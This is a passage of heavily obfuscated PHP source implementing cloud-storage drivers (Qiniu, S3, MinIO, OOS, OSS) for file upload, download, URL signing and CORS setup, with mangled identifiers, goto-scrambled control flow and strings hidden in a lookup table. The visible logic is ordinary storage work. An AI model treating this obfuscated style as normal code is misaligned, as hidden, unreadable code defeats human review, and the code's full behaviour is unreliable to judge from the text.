$e²†ß•ÖÆ[] = $this->link($CˆÚøöóê); } } else { $e²†ß•ÖÆ[] = $this->link($F³èò¿”Şâ); } goto D®´Æø¼÷; D®´Æø¼÷: $dŸË‡÷µ’ = new Qiniu\Cdn\CdnManager($this->auth); list($AÇÂ¾ÃêÀÕ, $FâìèìäÏ¸) = $dŸË‡÷µ’->refreshUrls($e²†ß•ÖÆ); if ($FâìèìäÏ¸) { return !1; } goto C‚£«ñÉÓÕ; fŒÌÚÓÑÄ£: } public function fileSubstr($bĞ—¿¢Š˜Œ, $Ağêßê‚å, $d·ˆÓå®­) { $BâõÆ¾ ÁÚ =& $_SERVER[Ö]; if (!($f‹éôš†ˆ‡ = $this->link($bĞ—¿¢Š˜Œ))) { return !1; } $AæÜ§Èµ—ª = !1; if ($d·ˆÓå®­ > 0) { $BÚªòÈ¤ÁÚ = $Ağêßê‚å + $d·ˆÓå®­ - 1; $AæÜ§Èµ—ª = array($BâõÆ¾ ÁÚ[1205] . $Ağêßê‚å . $BâõÆ¾ ÁÚ[408] . $BÚªòÈ¤ÁÚ); } $a¸ÀÜ£Ïğë = url_request($f‹éôš†ˆ‡, $BâõÆ¾ ÁÚ[212], !1, $AæÜ§Èµ—ª); return $a¸ÀÜ£Ïğë[$BâõÆ¾ ÁÚ[682]] ? $a¸ÀÜ£Ïğë[$BâõÆ¾ ÁÚ[1027]] : !1; } public function upload($CµÜ‡ò²§‹, $cèŒÏ³ò›Š, $eÃÏ°ƒ±ˆğ = false, $d¤„‡ˆÕêí = REPEAT_REPLACE) { $E‚ˆĞõÉ¹ = new Qiniu\Storage\UploadManager(); $D‹ª½°­ƒ = $this->auth->uploadToken($this->bucket, $CµÜ‡ò²§‹); $cå¢¾¤‹º• = get_file_mime(get_path_ext($cèŒÏ³ò›Š)); list($c™†àÖ‚Ï¦, $Eä¶ ‚¼›÷) = $E‚ˆĞõÉ¹->putFile($D‹ª½°­ƒ, $CµÜ‡ò²§‹, $cèŒÏ³ò›Š, null, $cå¢¾¤‹º•); return $Eä¶ ‚¼›÷ ? !1 : $this->getPathOuter($CµÜ‡ò²§‹); } public function uploadFormData($B¢²Á‹­ÔÒ, $F–†¡ëÚ— = 3600) { return $this->uploadToken($B¢²Á‹­ÔÒ, $F–†¡ëÚ—); } public function multiUploadFormData($dÅÊµÃÕ¸, $cËÎµâÁ‡ˆ = 3600) { return $this->uploadToken($dÅÊµÃÕ¸, $cËÎµâÁ‡ˆ); } private function uploadToken($D…«‚©Ş», $Dî×»Ş£¹ = 3600) { goto bïˆƒÛÌ¬ƒ; bïˆƒÛÌ¬ƒ: $FÌ¡¾±³«ƒ =& $_SERVER[Ö]; $eÆ››„†ß¾ = $Dî×»Ş£¹; $d¾“ãÙ–ª™ = array($FÌ¡¾±³«ƒ[1206] => $FÌ¡¾±³«ƒ[1207]); goto a¾óàÚ‘·; a¾óàÚ‘·: $cÚ£öæªŒ = null; $BŸˆµ¯É§Ö = $this->auth->uploadToken($this->bucket, $cÚ£öæªŒ, $eÆ››„†ß¾, $d¾“ãÙ–ª™, !0); $c¦©µ„ˆå = empty($this->region) || $this->region == $FÌ¡¾±³«ƒ[1208] ? $FÌ¡¾±³«ƒ[33] : $FÌ¡¾±³«ƒ[408] . $this->region; goto A„…ÇÊõßÑ; A„…ÇÊõßÑ: $eï¿ÇÆêÅÕ = http_type() . "\x3a\57\x2f\x75\x70\154\x6f\x61\x64{$c¦©µ„ˆå}\x2e\x71\151\x6e\x69\x75\x70\56\143\157\155\57"; return array($FÌ¡¾±³«ƒ[1209] => $BŸˆµ¯É§Ö, $FÌ¡¾±³«ƒ[1210] => $eï¿ÇÆêÅÕ); goto FºÀË’ÚîÌ; FºÀË’ÚîÌ: } public function download($A¬¢ööŠ–Í, $a³½ÌÂÇµä) { goto fâŠÊŒÍ¬; fâŠÊŒÍ¬: $bË¼Ò‘‚•  = IO::getPathInner(IO::mkfile($a³½ÌÂÇµä)); if (!($Cã‚Ü±×Çƒ = $this->link($A¬¢ööŠ–Í))) { return !1; } $B‚ÒÅğŞ…¡ = 0; goto f©öŠÏãÌ•; fÂ¨«ô²ğÍ: fclose($D½ç®Ìä¿); return $a³½ÌÂÇµä; goto FŒÔ²¬×Õ; f©öŠÏãÌ•: $b¡øî¤¤½ö = 1024 * 200; $D½ç®Ìä¿ = fopen($bË¼Ò‘‚• , $_SERVER[Ö][1211]); while (!0) { $F‡ÊÄ”áÁ = $this->fileSubstr($A¬¢ööŠ–Í, $B‚ÒÅğŞ…¡, $b¡øî¤¤½ö); if ($F‡ÊÄ”áÁ === !1) { return !1; } fwrite($D½ç®Ìä¿, $F‡ÊÄ”áÁ); $B‚ÒÅğŞ…¡ += $b¡øî¤¤½ö; if (strlen($F‡ÊÄ”áÁ) < $b¡øî¤¤½ö) { break; } } goto fÂ¨«ô²ğÍ; FŒÔ²¬×Õ: } public function link($E™ƒÏ¿©ÏÔ, $AÙÂÈˆöÚÇ = '') { if (!$this->isFile($E™ƒÏ¿©ÏÔ)) { return !1; } $CŒ†ªò†Ä = $this->getHost() . $_SERVER[Ö][8] . $this->pathEncode($E™ƒÏ¿©ÏÔ) . $AÙÂÈˆöÚÇ; return $this->auth->privateDownloadUrl($CŒ†ªò†Ä, 3600 * 12); } public function fileOut($f›ÈèÒà¥‘, $eğŞŞº×­Â = false, $fŠƒ³æÑ¤… = false, $aİÎÚá„“ = '') { $aŸÆè‡ùë• =& $_SERVER[Ö]; if (!$fŠƒ³æÑ¤…) { $fŠƒ³æÑ¤… = $this->pathThis($f›ÈèÒà¥‘); } $FÔ¥¤„•ÖÌ = $eğŞŞº×­Â ? $aŸÆè‡ùë•[1212] . rawurlencode($fŠƒ³æÑ¤…) : $aŸÆè‡ùë•[33]; $c„ø¾“É£‰ = $this->link($f›ÈèÒà¥‘, $FÔ¥¤„•ÖÌ); $this->fileOutLink($c„ø¾“É£‰); } public function fileOutServer($BÏ‚ğÅ×Òä, $b¬äøÑíÌ° = false, $cïÕ…ã‰”ª = false, $dŸ‡ß‹Ñá³ = '') { parent::fileOut($BÏ‚ğÅ×Òä, $b¬äøÑíÌ°, $cïÕ…ã‰”ª, $dŸ‡ß‹Ñá³); } public function fileOutImage($A¾ÔÄ‰í•, $DÅÄíâ¦ = 250) { $d°¤¢ŒÓÕ = $this->link($A¾ÔÄ‰í•, $_SERVER[Ö][1213] . $DÅÄíâ¦); $this->fileOutLink($d°¤¢ŒÓÕ); } public function fileOutImageServer($C–¼Ôğ•, $AßÃª‡¨·— = 250) { parent::fileOutImage($C–¼Ôğ•, $AßÃª‡¨·—); } public function hashMd5($fÚÄòîŞãä) { $BÛ‘Œë†²ã =& $_SERVER[Ö]; $Aæ…‘¿ñÖ¨ = $this->objectMeta($fÚÄòîŞãä); return isset($Aæ…‘¿ñÖ¨[$BÛ‘Œë†²ã[192]]) ? $Aæ…‘¿ñÖ¨[$BÛ‘Œë†²ã[192]] : !1; $Dğ“–öÚÍ» = $this->link($fÚÄòîŞãä, $BÛ‘Œë†²ã[1214]); } public function size($a‘ƒõ»³Š«) { $aÙä–±ä‘À = $this->objectMeta($a‘ƒõ»³Š«); return $aÙä–±ä‘À ? $aÙä–±ä‘À[$_SERVER[Ö][77]] : 0; } public function info($EçÌ‘òÔ) { if ($this->isFolder($EçÌ‘òÔ)) { return $this->folderInfo($EçÌ‘òÔ); } else { if ($this->isFile($EçÌ‘òÔ)) { return $this->fileInfo($EçÌ‘òÔ); } } return !1; } public function exist($c÷¶¹¢™í) { return $this->isFile($c÷¶¹¢™í) || $this->isFolder($c÷¶¹¢™í); } public function isFile($Dê‹¢…œË—) { return !$this->isFolder($Dê‹¢…œË—) && $this->objectMeta($Dê‹¢…œË—); } public function isFolder($aøŞ¥™í™¼) { return $this->cacheMethod($_SERVER[Ö][219], $aøŞ¥™í™¼); } protected function objectMeta($eÎ½Íë¸„) { return $this->cacheMethod($_SERVER[Ö][220], $eÎ½Íë¸„); } protected function _objectMeta($E³—Ÿâ†íÍ) { $A–è‚Üó¦ç =& $_SERVER[Ö]; list($Døğ²ô†°á, $fáÁç…Õ÷ò) = $this->bucketManager->stat($this->bucket, $E³—Ÿâ†íÍ); if ($Døğ²ô†°á) { $Døğ²ô†°á[$A–è‚Üó¦ç[77]] = intval($Døğ²ô†°á[$A–è‚Üó¦ç[1201]]); } return $Døğ²ô†°á; } protected function _isFolder($A²Á…ôÌÛ¯) { $F¥‘¡İÌó‹ =& $_SERVER[Ö]; list($D¸¬Ø¬ƒÓÙ, $F´Å¡ÌÆÎ—) = $this->bucketManager->listFiles($this->bucket, trim($A²Á…ôÌÛ¯, $F¥‘¡İÌó‹[8]) . $F¥‘¡İÌó‹[8], $F¥‘¡İÌó‹[33], 1, $F¥‘¡İÌó‹[8]); return !empty($D¸¬Ø¬ƒÓÙ[$F¥‘¡İÌó‹[1200]]) || !empty($D¸¬Ø¬ƒÓÙ[$F¥‘¡İÌó‹[1203]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($a„Ê”ê—¬è) { parent::__construct($a„Ê”ê—¬è); } public function uploadFormData($cæ‘ÍëÊØé, $Bè²º“£¾¤ = 3600) { goto EØÆĞœ„¸; aÃ²ñ°ÂÀ¼: $CÎƒçé‰ßŸ = array($c³ˆÀ»Àœ¶[195] => $c³ˆÀ»Àœ¶[33], $c³ˆÀ»Àœ¶[1131] => $c³ˆÀ»Àœ¶[33], $c³ˆÀ»Àœ¶[1090] => $C­Ö‡Ãï°„, $c³ˆÀ»Àœ¶[1094] => $B…‘‰šóÏØ, $c³ˆÀ»Àœ¶[1098] => $c‡”Ö”è ‘, $c³ˆÀ»Àœ¶[1132] => $cÇñ‰ç»”, $c³ˆÀ»Àœ¶[1133] => $FØ¸Ì¬ğÜ’, $c³ˆÀ»Àœ¶[1134] => $FÑ…§ŠÀ—Ô, $c³ˆÀ»Àœ¶[1135] => $Dåó®ƒµ¿¶, $c³ˆÀ»Àœ¶[1136] => $e”›ÕÂ÷½¢, $c³ˆÀ»Àœ¶[165] => $this->getHost()); return $CÎƒçé‰ßŸ; goto CÏ¬­ƒ«Ùñ; eŞ×”Ù¥¶Ú: $c‡”Ö”è ‘ = base64_encode(json_encode($eì åÇçù)); $A£Òï³â¹¶ = hash_hmac($c³ˆÀ»Àœ¶[1129], $Fæé‰ƒªøÆ, $c³ˆÀ»Àœ¶[1130] . $this->secret, !0); $E¯Çˆ™Û§ï = hash_hmac($c³ˆÀ»Àœ¶[1129], $this->region, $A£Òï³â¹¶, !0); goto fŸÕé¥•; bÆ‰ƒœğ¨ˆ: $Bïßé¬åÉé = $c³ˆÀ»Àœ¶[59]; $FÑ…§ŠÀ—Ô = gmdate($c³ˆÀ»Àœ¶[1120]); $Fæé‰ƒªøÆ = gmdate($c³ˆÀ»Àœ¶[683]); goto C˜˜ìçÎµ; b¨ÓÌÇ±áá: $Aã‹·Ï½½é = array($this->accessKey, $Fæé‰ƒªøÆ, $this->region, $Bïßé¬åÉé, $A“ïš‰ôÆ); $cÇñ‰ç»” = implode($c³ˆÀ»Àœ¶[8], $Aã‹·Ï½½é); $eì åÇçù = array($c³ˆÀ»Àœ¶[1088] => gmdate($c³ˆÀ»Àœ¶[1087], strtotime($c³ˆÀ»Àœ¶[1122])), $c³ˆÀ»Àœ¶[1089] => array(array($c³ˆÀ»Àœ¶[1091] => $this->bucket), array($c³ˆÀ»Àœ¶[1090] => $C­Ö‡Ãï°„), array($c³ˆÀ»Àœ¶[1092], $c³ˆÀ»Àœ¶[1093], $c³ˆÀ»Àœ¶[33]), array($c³ˆÀ»Àœ¶[1092], $c³ˆÀ»Àœ¶[1123], $c³ˆÀ»Àœ¶[33]), array($c³ˆÀ»Àœ¶[1092], $c³ˆÀ»Àœ¶[1124], $c³ˆÀ»Àœ¶[33]), array($c³ˆÀ»Àœ¶[1094] => $B…‘‰šóÏØ), array($c³ˆÀ»Àœ¶[1125] => $cÇñ‰ç»”), array($c³ˆÀ»Àœ¶[1126] => $FØ¸Ì¬ğÜ’), array($c³ˆÀ»Àœ¶[1127] => $FÑ…§ŠÀ—Ô), array($c³ˆÀ»Àœ¶[1128] => $Dåó®ƒµ¿¶))); goto eŞ×”Ù¥¶Ú; EØÆĞœ„¸: $c³ˆÀ»Àœ¶ =& $_SERVER[Ö]; $C­Ö‡Ãï°„ = $c³ˆÀ»Àœ¶[181]; $FØ¸Ì¬ğÜ’ = $c³ˆÀ»Àœ¶[1119]; goto bÆ‰ƒœğ¨ˆ; fŸÕé¥•: $a¹ƒ‘æ¾êÅ = hash_hmac($c³ˆÀ»Àœ¶[1129], $Bïßé¬åÉé, $E¯Çˆ™Û§ï, !0); $fóÚÏŠ©à = hash_hmac($c³ˆÀ»Àœ¶[1129], $A“ïš‰ôÆ, $a¹ƒ‘æ¾êÅ, !0); $e”›ÕÂ÷½¢ = hash_hmac($c³ˆÀ»Àœ¶[1129], $c‡”Ö”è ‘, $fóÚÏŠ©à); goto aÃ²ñ°ÂÀ¼; C˜˜ìçÎµ: $A“ïš‰ôÆ = $c³ˆÀ»Àœ¶[1121]; $Dåó®ƒµ¿¶ = $Bè²º“£¾¤ . $c³ˆÀ»Àœ¶[33]; $B…‘‰šóÏØ = $c³ˆÀ»Àœ¶[1086]; goto b¨ÓÌÇ±áá; CÏ¬­ƒ«Ùñ: } public function multiUploadFormData($BØëÂ†ì‘, $c•àÇÕ‹ñ = 3600) { $F¼¦ĞÂšô =& $_SERVER[Ö]; $c§ŞÉÙâ£ê = gmdate($F¼¦ĞÂšô[1215]); $f˜öÇìíõ = array(); $dÀ…Ñß×‰ = $this->client->getUploadId($this->bucket, $BØëÂ†ì‘, $f˜öÇìíõ); if (!$dÀ…Ñß×‰) { return !1; } return array($F¼¦ĞÂšô[205] => $dÀ…Ñß×‰, $F¼¦ĞÂšô[165] => $this->getHost() . $F¼¦ĞÂšô[8] . $this->pathEncode($BØëÂ†ì‘), $F¼¦ĞÂšô[206] => $c§ŞÉÙâ£ê, $F¼¦ĞÂšô[89] => $BØëÂ†ì‘); } public function multiUploadAuthData($C™®à»£‚Â, $D½ô¯¸÷‰¼ = array()) { goto c›ŞÜâ²Î; Eë”ªùæ‘¬: if (isset($D½ô¯¸÷‰¼[$E«¯ŒÃÊÚë[1216]])) { $aï´¶‘ö°[$E«¯ŒÃÊÚë[1217]] = $D½ô¯¸÷‰¼[$E«¯ŒÃÊÚë[1216]]; } $fòœƒÍŠí = explode($E«¯ŒÃÊÚë[167], $this->getHost()); $cè‰ó¸Ùª = array($E«¯ŒÃÊÚë[1218] => $fòœƒÍŠí[1], $E«¯ŒÃÊÚë[1219] => $E«¯ŒÃÊÚë[33], $E«¯ŒÃÊÚë[195] => $E«¯ŒÃÊÚë[115], $E«¯ŒÃÊÚë[1131] => $D½ô¯¸÷‰¼[$E«¯ŒÃÊÚë[77]]); goto f‚«£ò¸¢¼; f‚«£ò¸¢¼: $F×‚œ¼Â…Ç = $E«¯ŒÃÊÚë[210]; $AË†á½¿È¿ = $E«¯ŒÃÊÚë[8] . $this->pathEncode($B‡ˆ°ÂÇ³») . $D®Áğáñß; $fö¬ğÔÆ˜Á = $this->client->__getSignatureV4($aï´¶‘ö°, $cè‰ó¸Ùª, $F×‚œ¼Â…Ç, $AË†á½¿È¿); goto Aå÷ÕÂ÷‘ ; FŸ“±í™Ä…: unset($D½ô¯¸÷‰¼[$E«¯ŒÃÊÚë[89]]); if (isset($D½ô¯¸÷‰¼[$E«¯ŒÃÊÚë[207]])) { return $this->listUploadParts($B‡ˆ°ÂÇ³», $D½ô¯¸÷‰¼); } $aï´¶‘ö° = array(); goto Eë”ªùæ‘¬; Aå÷ÕÂ÷‘ : if (strpos($D®Áğáñß, $E«¯ŒÃÊÚë[209]) === 0) { if (isset($aï´¶‘ö°[$E«¯ŒÃÊÚë[1217]])) { $A»¸ºÑÏªÒ = $aï´¶‘ö°[$E«¯ŒÃÊÚë[1217]]; } else { if (isset($fö¬ğÔÆ˜Á[$E«¯ŒÃÊÚë[1217]])) { $A»¸ºÑÏªÒ = $fö¬ğÔÆ˜Á[$E«¯ŒÃÊÚë[1217]]; } else { $A»¸ºÑÏªÒ = hash($E«¯ŒÃÊÚë[1129], $E«¯ŒÃÊÚë[33]); } } return array($E«¯ŒÃÊÚë[216] => $fö¬ğÔÆ˜Á[$E«¯ŒÃÊÚë[216]], $E«¯ŒÃÊÚë[1217] => $A»¸ºÑÏªÒ, $E«¯ŒÃÊÚë[206] => $fö¬ğÔÆ˜Á[$E«¯ŒÃÊÚë[1220]]); } return $fö¬ğÔÆ˜Á[$E«¯ŒÃÊÚë[216]]; goto Eœğ²¥Á; c›ŞÜâ²Î: $E«¯ŒÃÊÚë =& $_SERVER[Ö]; $D®Áğáñß = isset($D½ô¯¸÷‰¼[$E«¯ŒÃÊÚë[156]]) ? $D½ô¯¸÷‰¼[$E«¯ŒÃÊÚë[156]] : $E«¯ŒÃÊÚë[33]; $B‡ˆ°ÂÇ³» = $D½ô¯¸÷‰¼[$E«¯ŒÃÊÚë[89]]; goto FŸ“±í™Ä…; Eœğ²¥Á: } public function listUploadParts($Dôî­²ÍË, $F¯ç¦²ª¥“ = array()) { goto F¸ÙÀÍ«µ£; F¸ÙÀÍ«µ£: $eœ‘Ø¥ÌÅí =& $_SERVER[Ö]; $Bğ¬İïŞ¼‡ = str_replace($eœ‘Ø¥ÌÅí[217], $eœ‘Ø¥ÌÅí[33], $F¯ç¦²ª¥“[$eœ‘Ø¥ÌÅí[156]]); $FÓ«¢‰İİö = $this->client->listParts($this->bucket, $Dôî­²ÍË, $Bğ¬İïŞ¼‡); goto A†½×Ïäàê; dÒÖÀ‡›ÚŞ: $F‹é©ŠÌ‚‰ = array($eœ‘Ø¥ÌÅí[1218] => $c—Ÿ‹†¾É¦[1], $eœ‘Ø¥ÌÅí[195] => $eœ‘Ø¥ÌÅí[115], $eœ‘Ø¥ÌÅí[1131] => strlen($E¡—”Ş´óĞ)); $BçˆŒ¢‚Ù³ = $eœ‘Ø¥ÌÅí[208]; $C‘’´—®ª‘ = $eœ‘Ø¥ÌÅí[8] . $this->pathEncode($Dôî­²ÍË) . $F¯ç¦²ª¥“[$eœ‘Ø¥ÌÅí[156]]; goto cÈ…ŠÒ¾Š‹; A¾ê‹òî§š: $E¡—”Ş´óĞ .= $eœ‘Ø¥ÌÅí[1224]; $aóÕÌÛ§‚ = array(); $c—Ÿ‹†¾É¦ = explode($eœ‘Ø¥ÌÅí[167], $this->getHost()); goto dÒÖÀ‡›ÚŞ; A†½×Ïäàê: if (!$FÓ«¢‰İİö) { return !1; } $E¡—”Ş´óĞ = $eœ‘Ø¥ÌÅí[1221]; foreach ($FÓ«¢‰İİö as $b—æÏÚ•Šæ) { $E¡—”Ş´óĞ .= $eœ‘Ø¥ÌÅí[1222] . "\74\120\x61\162\164\x4e\x75\x6d\x62\x65\162\x3e{$b—æÏÚ•Šæ[$eœ‘Ø¥ÌÅí[1173]]}\x3c\x2f\120\141\x72\164\x4e\165\155\x62\145\162\76\xa" . "\x3c\x45\124\141\x67\x3e{$b—æÏÚ•Šæ[$eœ‘Ø¥ÌÅí[1174]]}\74\57\x45\x54\141\147\76\12" . $eœ‘Ø¥ÌÅí[1223]; } goto A¾ê‹òî§š; cÈ…ŠÒ¾Š‹: $F˜‚‡ùÑ¡á = $this->client->__getSignatureV4($aóÕÌÛ§‚, $F‹é©ŠÌ‚‰, $BçˆŒ¢‚Ù³, $C‘’´—®ª‘, $E¡—”Ş´óĞ); return array($eœ‘Ø¥ÌÅí[216] => $F˜‚‡ùÑ¡á[$eœ‘Ø¥ÌÅí[216]], $eœ‘Ø¥ÌÅí[206] => $F˜‚‡ùÑ¡á[$eœ‘Ø¥ÌÅí[1220]], $eœ‘Ø¥ÌÅí[218] => $FÓ«¢‰İİö, $eœ‘Ø¥ÌÅí[1217] => $F˜‚‡ùÑ¡á[$eœ‘Ø¥ÌÅí[1217]]); goto A§£³Ì†; A§£³Ì†: } public function link($F‹Â»å¶°î, $Dâ‚²ÄâÕ = array()) { return parent::link($F‹Â»å¶°î, $Dâ‚²ÄâÕ); } public function fileOut($Cèà—Ú¬…’, $CÏºÜçÂ‚Û = false, $D‹ôãÉŸæ­ = false, $Døåç‚ºå = '') { if (strstr($this->endpoint, $_SERVER[Ö][1225])) { return parent::fileOutServer($Cèà—Ú¬…’, $CÏºÜçÂ‚Û, $D‹ôãÉŸæ­, $Døåç‚ºå); } parent::fileOut($Cèà—Ú¬…’, $CÏºÜçÂ‚Û, $D‹ôãÉŸæ­, $Døåç‚ºå); } public function fileOutImage($Cš‹“¸ƒ¦, $B¡‡ğóâ‹¹ = 250) { if (strstr($this->endpoint, $_SERVER[Ö][1225])) { return parent::fileOutImageServer($Cš‹“¸ƒ¦, $B¡‡ğóâ‹¹); } parent::fileOutImage($Cš‹“¸ƒ¦, $B¡‡ğóâ‹¹); } public function fileOutLink($e”ñ‹±ÍŠ) { $fË²‰‰‡‘‘ =& $_SERVER[Ö]; if (substr($e”ñ‹±ÍŠ, 0, 7) == $fË²‰‰‡‘‘[1101]) { $e”ñ‹±ÍŠ = $fË²‰‰‡‘‘[1102] . substr($e”ñ‹±ÍŠ, 7); } header($fË²‰‰‡‘‘[152] . $e”ñ‹±ÍŠ); die; } public function getHost() { $e‰Ôå†„‡‚ =& $_SERVER[Ö]; $FÚ”íŞÅå‹ = str_rtrim(parent::getHost(), $e‰Ôå†„‡‚[8] . $this->bucket); $FÚ”íŞÅå‹ = explode($e‰Ôå†„‡‚[167], $FÚ”íŞÅå‹); return $FÚ”íŞÅå‹[0] . $e‰Ôå†„‡‚[167] . $this->bucket . $e‰Ôå†„‡‚[91] . $FÚ”íŞÅå‹[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($dÖ‚Ç¬È‰å, $Eˆ³ªÜîÍ = 0) { parent::__construct(); $this->source = $dÖ‚Ç¬È‰å; $this->sourceSize = $Eˆ³ªÜîÍ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($e—“÷÷İ·¶ = false) { return $this->sourceSize; } public function getContent($aÅ”Ú÷øÃ° = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $B¥•º…ß² = ftell($this->source); $bÙâÊ¼Ò‘ƒ = @fread($this->source, $this->sourceSize); fseek($this->source, $B¥•º…ß²); return $bÙâÊ¼Ò‘ƒ; } } public function fileSubstr($F…ÂÊíÎë× = false, $F×Çâïí½ = 0, $dŠ£”„¦ç“ = 0) { if (!$dŠ£”„¦ç“) { $dŠ£”„¦ç“ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $F×Çâïí½, $dŠ£”„¦ç“); } if ($this->sourceType == self::TYPE_FILE) { $eó”¨£ÁÍ© = ftell($this->source); fseek($this->source, $eó”¨£ÁÍ© + $F×Çâïí½); $eœ‚–îÎß¸ = @fread($this->source, $dŠ£”„¦ç“); fseek($this->source, $eó”¨£ÁÍ©); return $eœ‚–îÎß¸; } } public function hashMd5($Bö¯Ù°”˜ó = false) { return md5($this->getContent()); } public static function hash($A˜“©ÄŸĞ, $CÕ¾É¿æÆÑ = 0) { $FºùÌóœ« = new PathDriverStream($A˜“©ÄŸĞ, $CÕ¾É¿æÆÑ); return $FºùÌóœ«->hashSimple($A˜“©ÄŸĞ); } public static function md5($b©½ßŒŒÃ£, $DÎì ºÙ» = 0) { $bÇ±³šÜ¨Õ = new PathDriverStream($b©½ßŒŒÃ£, $DÎì ºÙ»); return $bÇ±³šÜ¨Õ->hashMd5($b©½ßŒŒÃ£); } } goto Aõ„âÖ­×Á; fç©’ƒÈ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($DÄ£ï‰¤­«) { parent::__construct($DÄ£ï‰¤­«); $this->signatureVersion($_SERVER[Ö][196]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($E™ïˆ­²’Ş) { parent::__construct($E™ïˆ­²’Ş); $this->signatureVersion($_SERVER[Ö][196]); } public function fileOutLink($b‚’î˜ùÚì) { $BïÄƒ¶†²ª =& $_SERVER[Ö]; if (substr($b‚’î˜ùÚì, 0, 7) == $BïÄƒ¶†²ª[1101]) { $b‚’î˜ùÚì = $BïÄƒ¶†²ª[1102] . substr($b‚’î˜ùÚì, 7); } header($BïÄƒ¶†²ª[152] . $b‚’î˜ùÚì); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($d˜î´ƒÒö) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ö][1156]; $this->_init($d˜î´ƒÒö); } public function _init($f™®¹šÇ™) { foreach ($f™®¹šÇ™ as $bíÉ—âæ© => $E¤º‚íé®è) { if (isset($this->{$bíÉ—âæ©})) { $this->{$bíÉ—âæ©} = $E¤º‚íé®è; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Ö][1157], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto CÍ„‚ŒóÁå; D·ËŒ¥ÆßË: $f¤İ±Æò->addAllowedMethod($b½ğï˜¯ó[1161]); $f¤İ±Æò->addAllowedMethod($b½ğï˜¯ó[1162]); $f¤İ±Æò->addAllowedMethod($b½ğï˜¯ó[151]); goto Cæ„»ò¤Êœ; eëÛÚÂ–ğ: $f¤İ±Æò->addAllowedOrigin($b½ğï˜¯ó[1158]); $f¤İ±Æò->addAllowedMethod($b½ğï˜¯ó[1159]); $f¤İ±Æò->addAllowedMethod($b½ğï˜¯ó[1160]); goto D·ËŒ¥ÆßË; díÀÑÓÌ©»: $A‰Áòó¡µî->addRule($f¤İ±Æò); try { $this->client->putBucketCors($this->bucket, $A‰Áòó¡µî); } catch (OSS\Core\OssException $C°¡ÚöÉ“Ô) { return !1; } return !0; goto bîˆùµ¥­; CÍ„‚ŒóÁå: $b½ğï˜¯ó =& $_SERVER[Ö]; $A‰Áòó¡µî = new OSS\Model\CorsConfig(); $f¤İ±Æò = new OSS\Model\CorsRule(); goto eëÛÚÂ–ğ; Cæ„»ò¤Êœ: $f¤İ±Æò->setMaxAgeSeconds(600); $f¤İ±Æò->addExposeHeader($b½ğï˜¯ó[1163]); $f¤İ±Æò->addAllowedHeader($b½ğï˜¯ó[1158]); goto díÀÑÓÌ©»; bîˆùµ¥­: } public function getBucketCors() { goto b»šªìñ—ñ; FÖˆíïÛÕ“: $d¡ˆÁ÷¸×° = $dÛÑ×‰‰¦[0]->getMaxAgeSeconds(); $A‰»ÔÔŒ¬® = $dÛÑ×‰‰¦[0]->getExposeHeaders(); $d‹Â‚´³Å› = $dÛÑ×‰‰¦[0]->getAllowedHeaders(); goto Fó‰»ÈÙä…; Fó‰»ÈÙä…: return array($c–Š©›øÕ[171] => isset($B†ÑÆ«Ÿ[0]) ? $B†ÑÆ«Ÿ[0] : $c–Š©›øÕ[33], $c–Š©›øÕ[175] => $aÙ‘âŸİáª, $c–Š©›øÕ[1164] => $d¡ˆÁ÷¸×°, $c–Š©›øÕ[1165] => isset($A‰»ÔÔŒ¬®[0]) ? $A‰»ÔÔŒ¬®[0] : $c–Š©›øÕ[33], $c–Š©›øÕ[173] => isset($d‹Â‚´³Å›[0]) ? $d‹Â‚´³Å›[0] : $c–Š©›øÕ[33]); goto bš•‡¡¢; D´°‘ğ‹Æµ: if (!$c‡×›ª„ë || !($dÛÑ×‰‰¦ = $c‡×›ª„ë->getRules())) { return null; } $B†ÑÆ«Ÿ = $dÛÑ×‰‰¦[0]->getAllowedOrigins(); $aÙ‘âŸİáª = $dÛÑ×‰‰¦[0]->getAllowedMethods(); goto FÖˆíïÛÕ“; b»šªìñ—ñ: $c–Š©›øÕ =& $_SERVER[Ö]; $c‡×›ª„ë = null; try { $c‡×›ª„ë = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $b™í¤ã¼íÍ) { return null; } goto D´°‘ğ‹Æµ; bš•‡¡¢: } public function isBucketCors() { goto AÖéÑä˜š; AÖéÑä˜š: $D´©åì”¹† =& $_SERVER[Ö]; $b ÀãÙ‚—ë = $this->getBucketCors(); if (!$b ÀãÙ‚—ë || !is_array($b ÀãÙ‚—ë)) { return !1; } goto EõÚ‚Àğ¶ ; fÕ¼„ä†¬Û: $eèÆ©ìÛ¥ = array($D´©åì”¹†[176], $D´©åì”¹†[177], $D´©åì”¹†[178], $D´©åì”¹†[179], $D´©åì”¹†[180]); $e‡†Ûöìõ‹ = array_diff($eèÆ©ìÛ¥, $b»±¯®½™); return empty($e‡†Ûöìõ‹); goto cßÆ¤àâÕÕ; EõÚ‚Àğ¶ : if ($b ÀãÙ‚—ë[$D´©åì”¹†[171]] != $D´©åì”¹†[172] || $b ÀãÙ‚—ë[$D´©åì”¹†[173]] != $D´©åì”¹†[172]) { return !1; } $b»±¯®½™ = array_map($D´©åì”¹†[174], $b ÀãÙ‚—ë[$D´©åì”¹†[175]]); if (!is_array($b»±¯®½™)) { $b»±¯®½™ = array(); } goto fÕ¼„ä†¬Û; cßÆ¤àâÕÕ: } public function mkfile($CÔºŒ±ê‹†, $CÒ ¢¶ˆØ = '', $c‰•Ú¸Ú = REPEAT_RENAME) { $AÉÙö°÷ = 